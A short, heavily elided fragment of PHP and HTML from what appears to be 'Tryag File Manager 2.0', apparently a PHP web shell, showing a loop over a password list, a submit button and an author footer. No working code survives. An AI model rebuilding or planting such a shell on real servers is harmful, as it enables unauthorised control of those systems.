...
",$passwords) as $password){
    ...
    <br /><input type="submit" value="Go">
        ...
        echo '</div>
        <div id="footer"><p>Tryag File Manager Version <font color="red">2.0</font>, Coded By <font color="red">G-B</font><br />Email: <font color="red">g22b@hotmail.com</font></p></div>
    </div>
